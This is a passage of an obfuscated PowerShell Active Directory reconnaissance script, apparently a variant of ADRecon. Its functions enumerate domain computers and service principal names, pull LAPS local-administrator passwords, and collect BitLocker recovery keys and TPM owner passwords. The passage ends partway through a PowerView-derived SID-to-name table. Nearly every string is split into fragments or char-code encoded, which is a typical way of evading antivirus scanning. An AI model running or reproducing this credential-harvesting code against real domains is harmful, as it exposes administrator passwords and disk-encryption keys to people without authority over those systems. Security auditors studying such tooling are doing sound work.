        [int] $ADRComputers = $true,

        [Parameter(Mandatory = $false)]
        [int] $ADRComputerSPNs = $false
    )

    If ($Method -eq ('ADW'+'S'))
    {
        If (!$ADRComputers)
        {
            Try
            {
                $ADComputers = @( Get-ADObject -LDAPFilter ('(&(s'+'am'+'A'+'ccount'+'Ty'+'pe=805306369)(se'+'rvicePrinci'+'palName='+'*))') -ResultPageSize $PageSize -Properties Name,servicePrincipalName )
            }
            Catch
            {
                Write-Warning ('[Get'+'-'+'A'+'DRCompu'+'t'+'er'+'] '+'Error wh'+'i'+'le'+' '+'en'+'umer'+'ati'+'n'+'g C'+'omp'+'uterSPN Objec'+'ts')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Try
            {
                $ADComputers = @( Get-ADComputer -Filter * -ResultPageSize $PageSize -Properties Description,DistinguishedName,DNSHostName,Enabled,IPv4Address,LastLogonDate,('msDS-Allow'+'edToD'+'ele'+'gat'+'eTo'),('ms-d'+'s-Cre'+'a'+'torSid'),('msD'+'S-S'+'u'+'ppo'+'rtedEncrypti'+'o'+'nTyp'+'es'),Name,OperatingSystem,OperatingSystemHotfix,OperatingSystemServicePack,OperatingSystemVersion,PasswordLastSet,primaryGroupID,SamAccountName,servicePrincipalName,SID,SIDHistory,TrustedForDelegation,TrustedToAuthForDelegation,UserAccountControl,whenChanged,whenCreated )
            }
            Catch
            {
                Write-Warning ('[G'+'et-'+'ADRCompute'+'r] Error wh'+'ile'+' '+'enume'+'ra'+'t'+'i'+'ng Computer'+' Obje'+'c'+'ts')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            If ($ADRComputers)
            {
                $ComputerObj = [ADRecon.ADWSClass]::ComputerParser($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRComputerSPNs)
            {
                $ComputerSPNObj = [ADRecon.ADWSClass]::ComputerSPNParser($ADComputers, $Threads)
            }
            Remove-Variable ADComputers
        }
    }

    If ($Method -eq ('LD'+'AP'))
    {
        If (!$ADRComputers)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ('(&(sa'+'mA'+'ccoun'+'tType=805'+'306369)'+'(servi'+'ceP'+'r'+'i'+'ncipa'+'lN'+'a'+'me'+'=*))')
            $ObjSearcher.PropertiesToLoad.AddRange((('na'+'me'),('serviceprincipa'+'l'+'n'+'ame')))
            $ObjSearcher.SearchScope = ('Sub'+'tre'+'e')
            Try
            {
                $ADComputers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ('['+'Get-'+'A'+'DR'+'C'+'o'+'mpute'+'r'+'] Error w'+'hi'+'le enumerating '+'Co'+'mputerSPN O'+'bj'+'ec'+'ts')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()
        }
        Else
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ('(s'+'amAc'+'countT'+'ype=805'+'3'+'06369'+')')
            $ObjSearcher.PropertiesToLoad.AddRange((('de'+'s'+'c'+'ription'),('di'+'stingui'+'s'+'he'+'dname'),('dnsh'+'ostn'+'ame'),('la'+'stlog'+'onti'+'mesta'+'mp'),('msDS-A'+'llowedToDe'+'l'+'egat'+'eTo'),('ms-'+'d'+'s-Cre'+'at'+'o'+'rSid'),('msDS'+'-'+'Supported'+'E'+'ncryption'+'Types'),('nam'+'e'),('objects'+'id'),('o'+'peratin'+'g'+'system'),('o'+'peratingsyst'+'em'+'h'+'o'+'tfix'),('opera'+'tings'+'yst'+'e'+'mser'+'v'+'ic'+'epack'),('o'+'per'+'ati'+'ngsystem'+'v'+'er'+'sion'),('prim'+'arygrou'+'p'+'id'),('pw'+'dla'+'st'+'set'),('samacc'+'oun'+'t'+'n'+'ame'),('ser'+'vicep'+'ri'+'nc'+'i'+'palnam'+'e'),('si'+'dhis'+'tory'),('user'+'ac'+'countc'+'ontrol'),('whe'+'ncha'+'nge'+'d'),('whe'+'ncreate'+'d')))
            $ObjSearcher.SearchScope = ('S'+'ubtr'+'ee')

            Try
            {
                $ADComputers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ('[Ge'+'t-A'+'DRCom'+'put'+'er'+'] Err'+'or while '+'en'+'um'+'erat'+'ing'+' Co'+'m'+'p'+'ut'+'er Object'+'s')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
            If ($ADRComputers)
            {
                $ComputerObj = [ADRecon.LDAPClass]::ComputerParser($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRComputerSPNs)
            {
                $ComputerSPNObj = [ADRecon.LDAPClass]::ComputerSPNParser($ADComputers, $Threads)
            }
            Remove-Variable ADComputers
        }
    }

    If ($ComputerObj)
    {
        Export-ADR -ADRObj $ComputerObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Comp'+'u'+'ters')
        Remove-Variable ComputerObj
    }
    If ($ComputerSPNObj)
    {
        Export-ADR -ADRObj $ComputerSPNObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Co'+'mputer'+'SP'+'Ns')
        Remove-Variable ComputerSPNObj
    }
}

# based on https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
Function Get-ADRLAPSCheck
{
<#
.SYNOPSIS
    Returns all LAPS (local administrator) stored passwords in the current (or specified) domain.

.DESCRIPTION
    Returns all LAPS (local administrator) stored passwords in the current (or specified) domain. Other details such as the Password Expiration, whether the password is readable by the current user are also returned.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ('AD'+'WS'))
    {
        Try
        {
            $ADComputers = @( Get-ADObject -LDAPFilter ('('+'sa'+'mA'+'cc'+'ou'+'ntTy'+'p'+'e=805306369'+')') -Properties CN,DNSHostName,('m'+'s-M'+'cs-Ad'+'mPwd'),('ms-Mcs'+'-'+'Ad'+'mPwdEx'+'pir'+'ation'+'Time') -ResultPageSize $PageSize )
        }
        Catch [System.ArgumentException]
        {
            Write-Warning ('[*] L'+'APS '+'is '+'no'+'t'+' i'+'mplemente'+'d.')
            Return $null
        }
        Catch
        {
            Write-Warning ('[Get-A'+'DRL'+'A'+'PSCheck]'+' Error while'+' enum'+'erating'+' LAPS Ob'+'j'+'ect'+'s')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total LAPS Objects: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            $LAPSObj = [ADRecon.ADWSClass]::LAPSParser($ADComputers, $Threads)
            Remove-Variable ADComputers
        }
    }

    If ($Method -eq ('L'+'DAP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('(samAccou'+'ntType=805'+'30'+'6369'+')')
        $ObjSearcher.PropertiesToLoad.AddRange(('cn',('dn'+'shostnam'+'e'),('ms-m'+'c'+'s-'+'admpwd'),('ms-m'+'c'+'s-admpwdex'+'pirati'+'ont'+'i'+'me')))
        $ObjSearcher.SearchScope = ('S'+'ubtr'+'ee')
        Try
        {
            $ADComputers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Get'+'-ADRLAP'+'SC'+'h'+'ec'+'k] Er'+'ror w'+'h'+'ile enumer'+'a'+'ting LAPS O'+'bje'+'cts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADComputers)
        {
            $LAPSCheck = [ADRecon.LDAPClass]::LAPSCheck($ADComputers)
            If (-Not $LAPSCheck)
            {
                Write-Warning ('[*] LAPS '+'is '+'not'+' i'+'mplemented.')
                Return $null
            }
            Else
            {
                Write-Verbose "[*] Total LAPS Objects: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
                $LAPSObj = [ADRecon.LDAPClass]::LAPSParser($ADComputers, $Threads)
                Remove-Variable ADComputers
            }
        }
    }

    If ($LAPSObj)
    {
        Return $LAPSObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRBitLocker
{
<#
.SYNOPSIS
    Returns all BitLocker Recovery Keys stored in the current (or specified) domain.

.DESCRIPTION
    Returns all BitLocker Recovery Keys stored in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ('A'+'DWS'))
    {
        Try
        {
            $ADBitLockerRecoveryKeys = Get-ADObject -LDAPFilter ('(o'+'b'+'jectC'+'la'+'ss=msFVE-R'+'eco'+'veryInfor'+'mation)') -Properties distinguishedName,msFVE-RecoveryPassword,msFVE-RecoveryGuid,msFVE-VolumeGuid,Name,whenCreated
        }
        Catch
        {
            Write-Warning ('[G'+'e'+'t-A'+'DRBit'+'Locker] '+'Erro'+'r wh'+'ile en'+'umerating msFV'+'E-'+'RecoveryInf'+'or'+'mat'+'i'+'on '+'O'+'b'+'jects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $([ADRecon.ADWSClass]::ObjectCount($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose ('[*'+'] '+'Tota'+'l '+'Bi'+'tLocke'+'r '+'R'+'ecovery '+'Ke'+'ys: '+"$cnt")
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    # Create the object for each instance.
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Di'+'stingu'+'is'+'hed '+'Na'+'me') -Value $((($_.distinguishedName -split '}')[1]).substring(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name ('N'+'ame') -Value $_.Name
                    $Obj | Add-Member -MemberType NoteProperty -Name ('w'+'henCreate'+'d') -Value $_.whenCreated
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Re'+'covery'+' Key'+' ID') -Value $([GUID] $_.'msFVE-RecoveryGuid')
                    $Obj | Add-Member -MemberType NoteProperty -Name ('R'+'ecov'+'e'+'ry Key') -Value $_.'msFVE-RecoveryPassword'
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Vo'+'lume G'+'UID') -Value $([GUID] $_.'msFVE-VolumeGuid')
                    Try
                    {
                        $TempComp = Get-ADComputer -Identity $Obj.'Distinguished Name' -Properties msTPM-OwnerInformation,msTPM-TpmInformationForComputer
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    }
                    If ($TempComp)
                    {
                        # msTPM-OwnerInformation (Vista/7 or Server 2008/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name ('m'+'sT'+'PM-O'+'w'+'n'+'er'+'Information') -Value $TempComp.'msTPM-OwnerInformation'

                        # msTPM-TpmInformationForComputer (Windows 8/10 or Server 2012/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name ('msT'+'P'+'M-TpmInf'+'or'+'mat'+'ionForCom'+'puter') -Value $TempComp.'msTPM-TpmInformationForComputer'
                        If ($null -ne $TempComp.'msTPM-TpmInformationForComputer')
                        {
                            # Grab the TPM Owner Info from the msTPM-InformationObject
                            $TPMObject = Get-ADObject -Identity $TempComp.'msTPM-TpmInformationForComputer' -Properties msTPM-OwnerInformation
                            $TPMRecoveryInfo = $TPMObject.'msTPM-OwnerInformation'
                        }
                        Else
                        {
                            $TPMRecoveryInfo = $null
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name ('msTPM-Owner'+'Info'+'rmatio'+'n') -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name ('msT'+'PM-TpmIn'+'f'+'ormati'+'o'+'nFo'+'rComputer') -Value $null
                        $TPMRecoveryInfo = $null

                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ('TP'+'M Ow'+'ner Pa'+'s'+'swo'+'rd') -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($Method -eq ('L'+'DAP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('(obje'+'ctClass=msF'+'VE'+'-'+'Re'+'covery'+'Inf'+'o'+'r'+'mat'+'io'+'n)')
        $ObjSearcher.PropertiesToLoad.AddRange((('d'+'i'+'s'+'t'+'ing'+'uishedName'),('ms'+'fve-r'+'ec'+'overyp'+'ass'+'word'),('m'+'sf'+'ve-'+'rec'+'overyguid'),('msf'+'ve'+'-volum'+'eguid'),('mstp'+'m'+'-own'+'erinfo'+'rmatio'+'n'),('mstp'+'m-tpm'+'i'+'nf'+'ormat'+'ion'+'forc'+'o'+'mpute'+'r'),('nam'+'e'),('w'+'hencre'+'ated')))
        $ObjSearcher.SearchScope = ('S'+'ubtree')

        Try
        {
            $ADBitLockerRecoveryKeys = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Get-AD'+'RB'+'it'+'Lo'+'cker]'+' Error w'+'hile enumeratin'+'g '+'ms'+'F'+'VE'+'-R'+'ecove'+'ryInfo'+'rm'+'atio'+'n Objec'+'ts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose ('[*]'+' '+'Tota'+'l '+'Bit'+'Locke'+'r'+' '+'R'+'eco'+'very '+'K'+'ey'+'s: '+"$cnt")
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    # Create the object for each instance.
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Disting'+'uis'+'hed'+' Nam'+'e') -Value $((($_.Properties.distinguishedname -split '}')[1]).substring(1))
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Na'+'me') -Value ([string] ($_.Properties.name))
                    $Obj | Add-Member -MemberType NoteProperty -Name ('w'+'he'+'nCreated') -Value ([DateTime] $($_.Properties.whencreated))
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Rec'+'o'+'very Key I'+'D') -Value $([GUID] $_.Properties.'msfve-recoveryguid'[0])
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Rec'+'ov'+'ery K'+'ey') -Value ([string] ($_.Properties.'msfve-recoverypassword'))
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Vol'+'ume G'+'UID') -Value $([GUID] $_.Properties.'msfve-volumeguid'[0])

                    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    $ObjSearcher.PageSize = $PageSize
                    $ObjSearcher.Filter = "(&(samAccountType=805306369)(distinguishedName=$($Obj.'Distinguished Name'))) "
                    $ObjSearcher.PropertiesToLoad.AddRange((('m'+'stp'+'m-ownerinform'+'atio'+'n'),('mstpm-tp'+'m'+'i'+'nforma'+'t'+'ionforcom'+'puter')))
                    $ObjSearcher.SearchScope = ('Su'+'btree')

                    Try
                    {
                        $TempComp = $ObjSearcher.FindAll()
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    }
                    $ObjSearcher.dispose()

                    If ($TempComp)
                    {
                        # msTPM-OwnerInformation (Vista/7 or Server 2008/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name ('ms'+'T'+'PM-Own'+'erInformat'+'ion') -Value $([string] $TempComp.Properties.'mstpm-ownerinformation')

                        # msTPM-TpmInformationForComputer (Windows 8/10 or Server 2012/R2)
                        $Obj | Add-Member -MemberType NoteProperty -Name ('ms'+'TPM-'+'TpmInformationForC'+'om'+'pu'+'t'+'er') -Value $([string] $TempComp.Properties.'mstpm-tpminformationforcomputer')
                        If ($null -ne $TempComp.Properties.'mstpm-tpminformationforcomputer')
                        {
                            # Grab the TPM Owner Info from the msTPM-InformationObject
                            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                            {
                                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($TempComp.Properties.'mstpm-tpminformationforcomputer')", $Credential.UserName,$Credential.GetNetworkCredential().Password
                                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                                $objSearcherPath.PropertiesToLoad.AddRange((('m'+'stp'+'m-ownerinform'+'at'+'ion')))
                                Try
                                {
                                    $TPMObject = $objSearcherPath.FindAll()
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                $objSearcherPath.dispose()

                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject.Properties.'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                            Else
                            {
                                Try
                                {
                                    $TPMObject = ([ADSI]"LDAP://$($TempComp.Properties.'mstpm-tpminformationforcomputer')")
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject.Properties.'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType NoteProperty -Name ('msTPM-Own'+'erInf'+'o'+'rm'+'ation') -Value $null
                        $Obj | Add-Member -MemberType NoteProperty -Name ('m'+'sTPM-TpmInfor'+'m'+'ationF'+'orC'+'o'+'mp'+'uter') -Value $null
                        $TPMRecoveryInfo = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ('TPM'+' Owner Pass'+'w'+'or'+'d') -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable cnt
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If ($BitLockerObj)
    {
        Return $BitLockerObj
    }
    Else
    {
        Return $null
    }
}

# Modified ConvertFrom-SID function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function ConvertFrom-SID
{
<#
.SYNOPSIS
    Converts a security identifier (SID) to a group/user name.

    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause

.DESCRIPTION
    Converts a security identifier string (SID) to a group/user name using IADsNameTranslate interface.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER ObjectSid
    Specifies one or more SIDs to convert.

.PARAMETER DomainFQDN
    Specifies the FQDN of the Domain.

.PARAMETER Credential
    Specifies an alternate credential to use for the translation.

.PARAMETER ResolveSIDs
    [bool]
    Whether to resolve SIDs in the ACLs module. (Default False)

.EXAMPLE

    ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108

    TESTLAB\harmj0y

.EXAMPLE

    "S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID

    TESTLAB\WINDOWS2$
    TESTLAB\harmj0y
    BUILTIN\Distributed COM Users

.EXAMPLE

    $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
    ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred

    TESTLAB\harmj0y

.INPUTS
    [String]
    Accepts one or more SID strings on the pipeline.

.OUTPUTS
    [String]
    The converted DOMAIN\username.
#>
    Param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [Alias(('S'+'ID'))]
        #[ValidatePattern('^S-1-.*')]
        [String]
        $ObjectSid,

        [Parameter(Mandatory = $false)]
        [string] $DomainFQDN,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false)]
        [bool] $ResolveSID = $false
    )

    BEGIN {
        # Name Translator Initialization Types
        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
        $ADS_NAME_INITTYPE_DOMAIN   = 1 # Initializes a NameTranslate object by setting the domain that the object binds to.
        #$ADS_NAME_INITTYPE_SERVER   = 2 # Initializes a NameTranslate object by setting the server that the object binds to.
        $ADS_NAME_INITTYPE_GC       = 3 # Initializes a NameTranslate object by locating the global catalog that the object binds to.

        # Name Transator Name Types
        # https://msdn.microsoft.com/en-us/library/aa772267%28v=vs.85%29.aspx
        #$ADS_NAME_TYPE_1779                     = 1 # Name format as specified in RFC 1779. For example, "CN=Jeff Smith,CN=users,DC=Fabrikam,DC=com".
        #$ADS_NAME_TYPE_CANONICAL                = 2 # Canonical name format. For example, "Fabrikam.com/Users/Jeff Smith".
        $ADS_NAME_TYPE_NT4                      = 3 # Account name format used in Windows. For example, "Fabrikam\JeffSmith".
        #$ADS_NAME_TYPE_DISPLAY                  = 4 # Display name format. For example, "Jeff Smith".
        #$ADS_NAME_TYPE_DOMAIN_SIMPLE            = 5 # Simple domain name format. For example, "JeffSmith@Fabrikam.com".
        #$ADS_NAME_TYPE_ENTERPRISE_SIMPLE        = 6 # Simple enterprise name format. For example, "JeffSmith@Fabrikam.com".
        #$ADS_NAME_TYPE_GUID                     = 7 # Global Unique Identifier format. For example, "{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}".
        $ADS_NAME_TYPE_UNKNOWN                  = 8 # Unknown name type. The system will estimate the format. This element is a meaningful option only with the IADsNameTranslate.Set or the IADsNameTranslate.SetEx method, but not with the IADsNameTranslate.Get or IADsNameTranslate.GetEx method.
        #$ADS_NAME_TYPE_USER_PRINCIPAL_NAME      = 9 # User principal name format. For example, "JeffSmith@Fabrikam.com".
        #$ADS_NAME_TYPE_CANONICAL_EX             = 10 # Extended canonical name format. For example, "Fabrikam.com/Users Jeff Smith".
        #$ADS_NAME_TYPE_SERVICE_PRINCIPAL_NAME   = 11 # Service principal name format. For example, "www/www.fabrikam.com@fabrikam.com".
        #$ADS_NAME_TYPE_SID_OR_SID_HISTORY_NAME  = 12 # A SID string, as defined in the Security Descriptor Definition Language (SDDL), for either the SID of the current object or one from the object SID history. For example, "O:AOG:DAD:(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-0-0)"

        # https://msdn.microsoft.com/en-us/library/aa772250.aspx
        #$ADS_CHASE_REFERRALS_NEVER       = (0x00) # The client should never chase the referred-to server. Setting this option prevents a client from contacting other servers in a referral process.
        #$ADS_CHASE_REFERRALS_SUBORDINATE = (0x20) # The client chases only subordinate referrals which are a subordinate naming context in a directory tree. For example, if the base search is requested for "DC=Fabrikam,DC=Com", and the server returns a result set and a referral of "DC=Sales,DC=Fabrikam,DC=Com" on the AdbSales server, the client can contact the AdbSales server to continue the search. The ADSI LDAP provider always turns off this flag for paged searches.
        #$ADS_CHASE_REFERRALS_EXTERNAL    = (0x40) # The client chases external referrals. For example, a client requests server A to perform a search for "DC=Fabrikam,DC=Com". However, server A does not contain the object, but knows that an independent server, B, owns it. It then refers the client to server B.
        $ADS_CHASE_REFERRALS_ALWAYS      = (0x60) # Referrals are chased for either the subordinate or external type.
    }

    PROCESS {
        $TargetSid = $($ObjectSid.TrimStart('O:'))
        $TargetSid = $($TargetSid.Trim('*'))
        If ($TargetSid -match ('^S-'+'1'+'-.*'))
        {
            Try
            {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch ($TargetSid) {
                    ('S-1'+'-0')         { ('Nul'+'l Auth'+'o'+'rity') }
                    ('S-'+'1-'+'0-0')       { ('N'+'obody') }
                    ('S-1-'+'1')         { ('World'+' Auth'+'ori'+'ty') }
                    ('S'+'-1-1'+'-0')       { ('Ev'+'er'+'yone') }
                    ('S-'+'1-2')         { ('L'+'ocal Au'+'thorit'+'y') }
                    ('S'+'-1-2-0')       { ('Loca'+'l') }
                    ('S-1-2'+'-'+'1')       { ('Co'+'nso'+'l'+'e Logo'+'n ') }
                    ('S-'+'1-3')         { ('Cre'+'at'+'or Aut'+'hori'+'ty') }
                    ('S-1-3'+'-'+'0')       { ('Cre'+'ato'+'r Own'+'er') }
                    ('S-1-'+'3-1')       { ('Cre'+'ator'+' Grou'+'p') }
                    ('S'+'-'+'1-3-2')       { ('Cre'+'at'+'or Owner Se'+'rver') }
                    ('S-1-'+'3'+'-3')       { ('Cre'+'ator'+' Group Serv'+'er') }
                    ('S-1'+'-3-'+'4')       { ('Owne'+'r '+'Rights') }
                    ('S-1-'+'4')         { ('Non-'+'uniqu'+'e Author'+'i'+'ty') }
                    ('S-1-'+'5')         { ('NT '+'Auth'+'o'+'rity') }
                    ('S-1-5-'+'1')       { ('D'+'ial'+'up') }
                    ('S'+'-1-5-'+'2')       { ('Net'+'wor'+'k') }
                    ('S-'+'1-5'+'-3')       { ('Ba'+'tch') }
                    ('S-1-5'+'-'+'4')       { ('Int'+'eracti'+'ve') }
                    ('S-1-5-'+'6')       { ('Se'+'rv'+'ice') }
                    ('S-1-5'+'-'+'7')       { ('Anon'+'ymous') }
                    ('S-'+'1-5-'+'8')       { ('P'+'roxy') }
                    ('S-1-'+'5-9')       { ('Ent'+'erpr'+'ise Domai'+'n'+' C'+'o'+'nt'+'roll'+'ers') }
                    ('S-1-5'+'-1'+'0')      { ('Prin'+'cipal Se'+'lf') }
                    ('S-1-5'+'-11')      { ('Aut'+'he'+'nticated'+' Users') }
                    ('S-1-5-'+'12')      { ('Res'+'t'+'ricted Code') }
                    ('S-1'+'-5'+'-13')      { ('Te'+'rminal S'+'erv'+'e'+'r Users') }
                    ('S-1-'+'5-'+'14')      { ('Re'+'mot'+'e Int'+'eractive '+'Log'+'on') }
                    ('S-1-'+'5-15')      { ('Thi'+'s O'+'rg'+'anizat'+'io'+'n ') }
                    ('S'+'-1-5-17')      { ('Th'+'is Organi'+'zat'+'i'+'on ') }
                    ('S-1'+'-'+'5-18')      { ('Loca'+'l Syst'+'em') }
                    ('S-'+'1-5-19')      { ('N'+'T Auth'+'ority') }
                    ('S-1-5-'+'2'+'0')      { ('N'+'T'+' Authority') }
                    ('S-1-'+'5-80'+'-0')    { ('Al'+'l S'+'er'+'vices ') }
                    ('S-1-5'+'-'+'32'+'-544')  { (('BUILTI'+'N'+'K79Ad'+'m'+'ini'+'strators').rEplaCe('K79','\')) }
                    ('S'+'-1-5-32-'+'5'+'45')  { (('BUILTI'+'NcNBU'+'s'+'er'+'s').REplace('cNB',[sTRiNg][CHAR]92)) }
                    ('S-1-5-'+'3'+'2-'+'546')  { (('BUILTIN{0}Gu'+'e'+'sts')-f[chAr]92) }
                    ('S'+'-1-5-3'+'2'+'-547')  { (('B'+'UILT'+'I'+'NfCvPo'+'wer U'+'sers').rEpLaCe(([Char]102+[Char]67+[Char]118),'\')) }
                    ('S'+'-1'+'-5-32-'+'548')  { (('B'+'U'+'I'+'LT'+'INi7'+'g'+'Acc'+'ount Operators').rePlace('i7g',[sTRING][cHAR]92)) }
                    ('S-1-5-'+'32-54'+'9')  { (('BUILT'+'INjcuSe'+'rv'+'er '+'O'+'perators')-rePlACe 'jcu',[cHAR]92) }
                    ('S-'+'1-5'+'-32-'+'550')  { (('BUILTINaZf'+'P'+'rint Opera'+'tors')  -CREplaCE([cHAr]97+[cHAr]90+[cHAr]102),[cHAr]92) }
                    ('S-1'+'-5-32'+'-551')  { (('BUILTIN{0'+'}Backup'+' Oper'+'ators')-F [chaR]92) }
                    ('S-'+'1-5-32-'+'552')  { (('B'+'UILTI'+'NK'+'ijR'+'e'+'pl'+'icators').RePLACE('Kij','\')) }
